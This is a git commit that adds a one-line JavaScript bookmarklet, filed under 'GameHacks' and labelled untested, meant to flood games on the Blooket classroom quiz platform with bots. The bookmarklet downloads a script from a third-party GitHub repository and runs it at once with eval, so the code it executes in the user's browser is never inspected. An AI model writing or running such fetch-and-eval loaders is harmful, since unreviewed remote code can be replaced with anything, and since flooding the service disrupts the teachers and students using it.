b902c19247b6a0f2b25d3f6c25be1977f4551cc1
pmzxyx <126836542+pmzxyx@users.noreply.github.com>
2023-03-02 17:42:22 -0800

    Create blooket bots v1 (untested).js

---
+++ GameHacks/blooket bots v1 (untested).js
@@ -0,0 +1,1 @@
+javascript:(function()%7Bfetch("https%3A%2F%2Fraw.githubusercontent.com%2Fseanv999%2FFlood-Blooklet%2Fmain%2FOpen%2520Source%2FFlooder.js")%0A.then((res) %3D> res.text()%0A.then((t) %3D> eval(t)))%7D)()%3B
